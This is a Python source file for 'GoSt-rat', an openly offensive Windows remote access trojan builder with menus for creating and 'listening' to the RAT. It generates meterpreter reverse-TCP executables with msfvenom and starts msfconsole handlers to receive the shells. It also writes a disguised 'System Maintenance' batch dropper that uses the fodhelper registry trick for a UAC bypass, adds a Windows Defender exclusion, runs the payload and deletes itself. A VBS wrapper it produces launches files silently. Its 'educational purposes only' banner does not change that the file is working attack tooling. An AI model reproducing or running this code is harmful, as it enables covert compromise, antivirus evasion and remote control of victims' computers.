#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GoSt-rat
Version : 1.0
Creator : Surafel Worku
"""

import os
import sys
import time


try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    RED     = Fore.RED + Style.BRIGHT
    CYAN    = Fore.CYAN + Style.BRIGHT
    YELLOW  = Fore.YELLOW + Style.BRIGHT
    WHITE   = Fore.WHITE + Style.BRIGHT
    MAGENTA = Fore.MAGENTA + Style.BRIGHT
    RESET   = Style.RESET_ALL
except ImportError:
    os.system("")
    RED    = "\033[1;31m"
    CYAN   = "\033[1;36m"
    YELLOW = "\033[1;33m"
    WHITE  = "\033[1;37m"
    MAGENTA= "\033[1;35m"
    RESET  = "\033[0m"


BANNER = r"""
 ██████╗  ██████╗ ███████╗████████╗    ██████╗  █████╗ ████████╗
██╔════╝ ██╔═══██╗██╔════╝╚══██╔══╝    ██╔══██╗██╔══██╗╚══██╔══╝
██║  ███╗██║   ██║███████╗   ██║       ██████╔╝███████║   ██║   
██║   ██║██║   ██║╚════██║   ██║       ██╔══██╗██╔══██║   ██║   
╚██████╔╝╚██████╔╝███████║   ██║       ██║  ██║██║  ██║   ██║ c2  
 ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
"""

GITHUB  = "https://github.com/surafel-creater/GOST_RATc2"   
VERSION = "1.0"
CREATOR = "Surafel Worku"

WARNING = f"""
  {RED}╔══════════════════════════════════════════════════════════╗
  ║{YELLOW}  ⚠⚠⚠              W A R N I N G              ⚠⚠⚠  {RED}      ║
  ╠══════════════════════════════════════════════════════════╣
  ║{WHITE}                                                          {RED}║
  ║{WHITE}   This tool is for EDUCATIONAL PURPOSES ONLY.            {RED}║
  ║{WHITE}   Do NOT use it on systems without permission.           {RED}║
  ║{WHITE}   You are responsible for your own actions.              {RED}║
  ║{WHITE}   The creator is NOT responsible for any misuse.         {RED}║
  ║{WHITE}                                                          {RED}║
  ╚══════════════════════════════════════════════════════════╝
"""

INFO = f"""
  {CYAN}╭─────────────────────────────────────────────╮
  {CYAN}│{MAGENTA} ⚡ Tool     :{WHITE} GoSt-rat {CYAN}                     │
  {CYAN}│{MAGENTA} ⚡ Version  :{WHITE} {VERSION} {CYAN}                      │
  {CYAN}│{MAGENTA} ⚡ Creator  :{WHITE} {CREATOR} {CYAN}            │
  {CYAN}│{MAGENTA} ⚡ GitHub   :{WHITE} {GITHUB} {CYAN}  │
  {CYAN}╰─────────────────────────────────────────────╯
"""


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def glitch_animation():
    """Glitch-style flicker animation for the banner."""
    glitches = ["@#%&$!", "Gost-rat", "###ERROR###", "Gost-rat"]
    for _ in range(2):
        for g in glitches:
            sys.stdout.write(f"\r{RED}  [ LOADiNG ] {YELLOW}{g:<15}{RESET}")
            sys.stdout.flush()
            time.sleep(0.12)
    print()


def show_banner():
    clear()
    glitch_animation()
    print(f"{RED}{BANNER}{RESET}")
    print(f"{YELLOW}  ══════════════════════════════════════════════════════════{RESET}")
    print(f"  {RED}💀  {WHITE}G O S T - R A T {CYAN}— {YELLOW}v{VERSION} {RED}💀{RESET}")
    print(f"{YELLOW}  ══════════════════════════════════════════════════════════{RESET}")
    print(INFO)
    print(WARNING)


import os
import subprocess
import sys
import time
import zipfile
import shutil
import glob

# --- Color definitions ---
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"


def clear():
    """Linux terminal clear."""
    os.system("clear")


def glitch_animation():
    """Glitch-style flicker animation for the banner."""
    glitches = ["@#%&$!", "Gost-rat", "###ERROR###", "Gost-rat"]
    for _ in range(2):
        for g in glitches:
            sys.stdout.write(f"\r{RED}  [ LOADiNG ] {YELLOW}{g:<15}{RESET}")
            sys.stdout.flush()
            time.sleep(0.12)
    print()


def show_banner():
    clear()
    glitch_animation()
    print(f"{RED}{BANNER}{RESET}")
    print(
        f"{YELLOW}  ══════════════════════════════════════════════════════════{RESET}"
    )
    print(f"  {RED}💀  {WHITE}G O S T - R A T {CYAN}— {YELLOW}v{VERSION} {RED}💀{RESET}")
    print(
        f"{YELLOW}  ══════════════════════════════════════════════════════════{RESET}"
    )
    print(INFO)
    print(WARNING)


def create_windows_rat():
    """Ask for LHOST/LPORT, then silently build the Windows payload with msfvenom."""
    clear()
    print(f"{CYAN}╔════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║     CREATE GOST-RAT (WINDOWS)      ║{RESET}")
    print(f"{CYAN}╚════════════════════════════════════╝{RESET}\n")

    print(f"{WHITE}Enter your listener details below.{RESET}\n")

    lhost = input(f"{YELLOW}GostRat{WHITE}@{RED}lhost{WHITE}:~$ {RESET}").strip()
    lport = input(f"{YELLOW}GostRat{WHITE}@{RED}lport{WHITE}:~$ {RESET}").strip()
    output_file = input(f"{YELLOW}GostRat{WHITE}@{RED}Name{WHITE}:~$ {RESET}").strip()
    if not lhost or not lport:
        print(f"\n{RED}[-] LHOST and LPORT are required. Returning to menu...{RESET}")
        time.sleep(2)
        return

    

    print(f"\n{GREEN}[+] Building payload...{RESET}")
    print(f"{CYAN}    LHOST : {WHITE}{lhost}{RESET}")
    print(f"{CYAN}    LPORT : {WHITE}{lport}{RESET}")
    print(f"{CYAN}    Output: {WHITE}{output_file}{RESET}\n")

    cmd = (
        f"msfvenom -p windows/x64/meterpreter_reverse_tcp "
        f"LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
    )

   
    try:
        result = subprocess.run(
            cmd, shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if result.returncode == 0 and os.path.exists(output_file):
            size = os.path.getsize(output_file)
            print(f"{GREEN}[✓] Payload created successfully: {WHITE}{output_file} {CYAN}({size} bytes){RESET}")
        else:
            print(f"{RED}[-] Payload creation failed. Check that msfvenom is installed.{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error creating payload: {e}{RESET}")

    input(f"\n{WHITE}Press Enter to return...{RESET}")







def create_bat_and_zip():
    """List .exe files in script folder, let user pick one, then build deploy .bat + zip (from Linux)."""
    clear()
    print(f"{CYAN}╔════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║    BUILD .BAT DEPLOYER + ZIP       ║{RESET}")
    print(f"{CYAN}╚════════════════════════════════════╝{RESET}\n")

    # ---------- STEP 1: list .exe files in the SCRIPT's own directory ----------
    script_dir = os.path.dirname(os.path.abspath(__file__))
    exes = sorted(
        f for f in glob.glob(os.path.join(script_dir, "*")) if os.path.isfile(f)
    )
    exes = list(dict.fromkeys(exes))  # remove duplicates

    if not exes:
        print(f"{RED}[-] No files found in: {WHITE}{script_dir}{RESET}")
        print(f"{YELLOW}[*] Current working directory was: {WHITE}{os.getcwd()}{RESET}")
        input(f"\n{WHITE}Press Enter to return...{RESET}")
        return

    print(f"{GREEN}[+] Found {len(exes)} file(s) in {WHITE}{script_dir}{RESET}:\n")
    for i, exe in enumerate(exes, start=1):
        size = os.path.getsize(exe)
        print(f"  {YELLOW}[{i}]{WHITE} {os.path.basename(exe)} {CYAN}({size} bytes){RESET}")


   
    try:
        pick = input(f"\n{YELLOW}Select exe number:{RESET} ").strip()
        chosen = exes[int(pick) - 1]
    except (ValueError, IndexError):
        print(f"\n{RED}[-] Invalid selection.{RESET}")
        time.sleep(1)
        return

    base = os.path.splitext(os.path.basename(chosen))[0]  
    target_name = f"{base}.exe"
    zip_name = f"{base}.zip"
    bat_name = f"{base}.bat"

    print(f"\n{GREEN}[+] Selected: {WHITE}{os.path.basename(chosen)}{RESET}")
    print(f"{CYAN}    Zip file : {WHITE}{zip_name}{RESET}")
    print(f"{CYAN}    Bat file : {WHITE}{bat_name}{RESET}\n")

    
    bat_content = f"""@echo off
:: ============================================================
::  {bat_name} - elevate, deploy {zip_name}, exclude, extract, execute
::  Place {zip_name} (containing {target_name}) in the SAME folder as this .bat
:: ============================================================
title System Maintenance
setlocal EnableDelayedExpansion

:: --- resolve full script path FIRST (works on every invocation) ---
set "SCRIPT=%~f0"
for %%A in ("%SCRIPT%") do set "SCRIPT_DIR=%%~dpA"

:: ---------- STEP 1: open normal (non-elevated) context ----------
net session >nul 2>&1
if %errorlevel%==0 goto :ELEVATED

:: ---------- STEP 2: elevate to administrator ----------
reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /d "\\"%SCRIPT%\\" ELEVATED" /f >nul 2>&1
reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v DelegateExecute /t REG_SZ /d "" /f >nul 2>&1

start "" /b "%WINDIR%\\System32\\fodhelper.exe"
timeout /t 5 /nobreak >nul

reg delete "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /f >nul 2>&1
exit

:: ================= ELEVATED SECTION =========================
:ELEVATED
if "%~1"=="ELEVATED" shift

echo [*] Running as: %USERNAME% (elevated)
echo [*] Script location: %SCRIPT_DIR%

:: ---------- STEP 3: copy {zip_name} to Documents ----------
set "DOCS=%USERPROFILE%\\Documents"
if not exist "%DOCS%" set "DOCS=%USERPROFILE%\\My Documents"
set "ZIP=%DOCS%\\{zip_name}"
set "TARGET=%DOCS%\\{target_name}"

copy /y "%SCRIPT_DIR%{zip_name}" "%ZIP%" >nul
if exist "%ZIP%" (
    echo [+] Copied {zip_name} -^> %ZIP%
) else (
    echo [!] ERROR: {zip_name} not found next to this script.
    pause
    exit /b 1
)

:: ---------- STEP 4: add Windows Defender exclusion (Documents folder) ----------
powershell -NoProfile -Command "try {{ Add-MpPreference -ExclusionPath '%DOCS%' -ErrorAction Stop; Write-Host '[+] Exclusion added for' '%DOCS%' }} catch {{ Write-Host '[!] Tamper Protection may block this:' $_.Exception.Message }}"

powershell -NoProfile -Command "$p=(Get-MpPreference).ExclusionPath; if ($p -contains '%DOCS%') {{ Write-Host '[+] VERIFIED: folder is excluded' }} else {{ Write-Host '[!] NOT excluded - check Tamper Protection' }}"

:: ---------- STEP 4b: extract {zip_name} -> {target_name} ----------
powershell -NoProfile -Command "try {{ Expand-Archive -LiteralPath '%ZIP%' -DestinationPath '%DOCS%' -Force -ErrorAction Stop; Write-Host '[+] Extracted {target_name}' }} catch {{ Write-Host '[!] Extraction failed:' $_.Exception.Message }}"

if not exist "%TARGET%" (
    echo [*] Trying tar fallback...
    tar -xf "%ZIP%" -C "%DOCS%"
)

if not exist "%TARGET%" (
    echo [!] ERROR: {target_name} was not extracted. Aborting.
    pause
    exit /b 1
)
echo [+] {target_name} ready at %TARGET%

:: ---------- STEP 5: run {target_name} ----------
echo [*] Launching {target_name} ...
start "" "%TARGET%"
timeout /t 3 >nul

echo [*] Done. Cleaning up...
del "%ZIP%" 2>nul
del "%~f0" 2>nul
exit
"""

    try:
        
        with open(bat_name, "w", newline="\r\n", encoding="ascii", errors="ignore") as f:
            f.write(bat_content)
        os.chmod(bat_name, 0o644)
        print(f"{GREEN}[✓] Created: {WHITE}{bat_name}{RESET}")

        # ---------- STEP 4: zip the chosen exe (zip name = exe name) ----------
        with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(chosen, arcname=target_name)
        size = os.path.getsize(zip_name)
        print(f"{GREEN}[✓] Created: {WHITE}{zip_name} {CYAN}({size} bytes, contains {target_name}){RESET}")

    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")

    input(f"\n{WHITE}Press Enter to return...{RESET}")



def run_command(cmd):
    """Executes a terminal command and displays its output cleanly."""
    try:
        subprocess.run(cmd, shell=True, check=True)
    except Exception as e:
        print(f"{RED}[-] Error executing command: {e}{RESET}")

def create_silent_vbs():
    cwd = os.getcwd()
    files = [f for f in os.listdir(cwd) if os.path.isfile(os.path.join(cwd, f))]

    if not files:
        print("No files found in the current directory.")
        return

    print("\nFiles in current directory:")
    for index, filename in enumerate(files, start=1):
        print(f"[{index}] {filename}")

    try:
        choice = int(input("\nEnter the number of the file: "))
        if not (1 <= choice <= len(files)):
            print("Invalid choice number.")
            return
    except ValueError:
        print("Please enter a valid integer.")
        return

    selected_file = files[choice - 1]
    base_name = os.path.splitext(selected_file)[0]
    vbs_filename = f"{base_name}.vbs"

    vbs_content = (
        'Set WshShell = CreateObject("WScript.Shell")\n'
        f'WshShell.Run "{selected_file}", 0, False\n'
    )

    with open(vbs_filename, "w", encoding="utf-8") as f:
        f.write(vbs_content)

    print(f"\nGenerated: {vbs_filename}")
    subprocess.run(["nano", vbs_filename])


import subprocess, time, os, signal, sys, re, select

def free_port(port):
    """Kill any leftover process holding the port (like: ss -tlnp | grep PORT + kill)."""
    try:
        out = subprocess.check_output(["ss", "-tlnp"], text=True)
    except Exception:
        return
    pids = set()
    for line in out.splitlines():
        if f":{port} " in line and "pid=" in line:
            pids.update(re.findall(r'pid=(\d+)', line))
    if pids:
        print(f"[*] Port {port} in use by PID(s) {', '.join(pids)} — killing...", flush=True)
        subprocess.run(["sudo", "kill", *pids])
        time.sleep(2)  





import re
import subprocess
import time
import netifaces





def get_port_pids(port=4444):
    """Runs 'sudo ss -tlnp' and parses all PIDs bound to the target port."""
    cmd = ["sudo", "ss", "-tlnp"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError as err:
        print(f"[!] Error running '{' '.join(cmd)}': {err}")
        return []

    pids = set()
    for line in result.stdout.splitlines():
        if f":{port}" in line:
            found_pids = re.findall(r"pid=(\d+)", line)
            pids.update(found_pids)

    return list(pids)


def clear_port(port=4444):
    """Finds processes listening on the port, kills them, and verifies it's clear."""
    print(f"\n[*] Checking for processes listening on port {port}...")
    pids = get_port_pids(port)

    if not pids:
        print(f"[+] Port {port} is completely clear. No processes found.")
        return True

    print(f"[!] Found active processes on port {port}: PID(s) {', '.join(pids)}")
    print(f"[*] Terminating: sudo kill {' '.join(pids)}")

    kill_cmd = ["sudo", "kill", "-9"] + pids
    subprocess.run(kill_cmd, check=False)

    time.sleep(0.5)

    remaining_pids = get_port_pids(port)
    if not remaining_pids:
        print(f"[+] Verified: Port {port} is now free (ss returned nothing).")
        return True
    else:
        print(
            f"[!] Warning: Processes still remaining on port {port}: {', '.join(remaining_pids)}"
        )
        return False



def auto_listener(interfaces=("eth0", "wlan0"), port=4444):
    """Finds active IP, frees the port, runs msfconsole handler in the
    foreground, and returns to network_submenu() when it exits or Ctrl+C."""

    # --- 1. Find an active IPv4 address ---
    selected_ip = None
    for iface in interfaces:
        try:
            addrs = netifaces.ifaddresses(iface)
            ipv4_info = addrs.get(netifaces.AF_INET)
            if ipv4_info and ipv4_info[0].get("addr"):
                selected_ip = ipv4_info[0]["addr"]
                print("=" * 40)
                print(f" [+] Connected Interface : {iface}")
                print(f" [+] Assigned IP Address : {selected_ip}")
                print("=" * 40)
                break
            else:
                print(f"[-] '{iface}' has no active IPv4 address. Checking fallback...")
        except ValueError:
            print(f"[-] Interface '{iface}' not found. Checking fallback...")

    if not selected_ip:
        print("=" * 40)
        print("[!] No active IPv4 address found on eth0 or wlan0.")
        print("=" * 40)

    # --- 2. Free the port ---
    port_freed = clear_port(port)
    if not port_freed:
        print(f"[!] Failed to free port {port}.")
        return network_submenu()

    display_ip = selected_ip if selected_ip else "0.0.0.0"

   
    cmd = (
        f'msfconsole -q -x "use exploit/multi/handler; '
        f'set payload windows/x64/meterpreter/reverse_tcp; '
        f'set LHOST {display_ip}; set LPORT {port}; run"'
    )

    print("\n[i] Starting handler on " + f"{display_ip}:{port} ...")
    print("[i] Press Ctrl + C (or exit meterpreter) to return to the menu.\n")
    try:
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n[!] Ctrl + C detected. Handler stopped.")

    print("=" * 40)
    print("[i] Redirecting to network_submenu()...")
    return network_submenu()


def manual_listener():
    """Asks for LHOST and LPORT, frees the port, runs msfconsole handler in the
    foreground (identical to auto_listener), and returns to network_submenu() when
    it exits or Ctrl+C."""

    # --- 0. Ask user for LHOST and LPORT ---
    LHOST = input("[?] Enter LHOST: ").strip()
    LPORT = int(input("[?] Enter LPORT [default 4444]: ").strip() or "4444")

    if not LHOST:
        print("[!] LHOST required")
        return network_submenu()

    display_ip = LHOST

    port_freed = clear_port(LPORT)
    if not port_freed:
        print(f"[!] Failed to free port {LPORT}.")
        return network_submenu()

    
    cmd = (
        f'msfconsole -q -x "use exploit/multi/handler; '
        f'set payload windows/x64/meterpreter/reverse_tcp; '
        f'set LHOST {display_ip}; set LPORT {LPORT}; run"'
    )

    print("\n[i] Starting handler on " + f"{display_ip}:{LPORT} ...")
    print("[i] Press Ctrl + C (or exit meterpreter) to return to the menu.\n")
    try:
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n[!] Ctrl + C detected. Handler stopped.")

    print("=" * 40)
    print("[i] Redirecting to network_submenu()...")
    return network_submenu()



def network_submenu():
    """Submenu for option 1: Network commands."""
    while True:
        clear()
        print(f"{CYAN}╔════════════════════════════════════╗{RESET}")
        print(f"{CYAN}║         NETWORK SUBMENU            ║{RESET}")
        print(f"{CYAN}╠════════════════════════════════════╣{RESET}")
        print(f"{CYAN}║  {YELLOW}[1]{WHITE} !Create Gost-Rat for windows.            {CYAN}║{RESET}")
        print(f"{CYAN}║  {YELLOW}[2]{WHITE} Set Rat bypass antivirus.    {CYAN}║{RESET}")
        print(f"{CYAN}║  {YELLOW}[3]{WHITE} Add vbs for rat(recommend)   {CYAN}║{RESET}")
        print(f"{CYAN}║  {YELLOW}[4]{WHITE} Back to Main Menu             {CYAN}║{RESET}")
        print(f"{CYAN}╚════════════════════════════════════╝{RESET}\n")

        sub_choice = input(f"{YELLOW}GostRat{WHITE}@{RED}network{WHITE}:~$ {RESET}").strip()

        if sub_choice == "1":
            create_windows_rat()
        elif sub_choice == "2":
            create_bat_and_zip()
            
        elif sub_choice == "3":
            create_silent_vbs()
        elif sub_choice == "4":
            break
        else:
            print(f"\n{RED}[-] Invalid option.{RESET}")
            time.sleep(1)


def filesystem_submenu():
    """Submenu for option 2: Filesystem / Directory commands."""
    while True:
        clear()
        print(f"{CYAN}╔════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{CYAN}║                    FILESYSTEM SUBMENU                      ║{RESET}")
        print(f"{CYAN}╠════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{CYAN}║                                                            ║{RESET}")
        print(f"{CYAN}║   {YELLOW}[1]{WHITE} Auto lisener                       {CYAN}║{RESET}")
        print(f"{CYAN}║   {YELLOW}[2]{WHITE} Manual lisener                        {CYAN}║{RESET}")
        print(f"{CYAN}║   {YELLOW}[3]{WHITE} Back to Main Menu                                     {CYAN}║{RESET}")
        print(f"{CYAN}║                                                            ║{RESET}")
        print(f"{CYAN}╚════════════════════════════════════════════════════════════╝{RESET}\n")

        sub_choice = input(f"{YELLOW}GostRat{WHITE}@{RED}fs{WHITE}:~$ {RESET}").strip()

        if sub_choice == "1":
            auto_listener()
        elif sub_choice == "2":
            manual_listener()
        elif sub_choice == "3":
            break
        else:
            print(f"\n{RED}[-] Invalid option.{RESET}")
            time.sleep(1)


def main_menu():
    """Interactive numeric choice menu."""
    while True:
        clear()
        print(f"{CYAN}╔════════════════════════════════════╗{RESET}")
        print(f"{CYAN}║            MAIN MENU               ║{RESET}")
        print(f"{CYAN}╠════════════════════════════════════╣{RESET}")
        print(f"{CYAN}║  {YELLOW}[1]{WHITE} Create and Modify Gost-Rat       {CYAN}║{RESET}")
        print(f"{CYAN}║  {YELLOW}[2]{WHITE} Listen Gost-Rat   {CYAN}║{RESET}")
        print(f"{CYAN}║  {YELLOW}[3]{WHITE} Exit                           {CYAN}║{RESET}")
        print(f"{CYAN}╚════════════════════════════════════╝{RESET}\n")

        choice = input(f"{YELLOW}GostRat{WHITE}@{RED}console{WHITE}:~$ {RESET}").strip()

        if choice == "1":
            network_submenu()
        elif choice == "2":
            filesystem_submenu()
        elif choice == "3":
            print(f"\n{RED}[!] Exiting GostRat. Goodbye!{RESET}\n")
            sys.exit(0)
        else:
            print(f"\n{RED}[-] Invalid option. Please enter 1, 2, or 3.{RESET}")
            time.sleep(1)


if __name__ == "__main__":
    show_banner()
    input(f"{WHITE}  Press Enter to continue...{RESET}")
    main_menu()

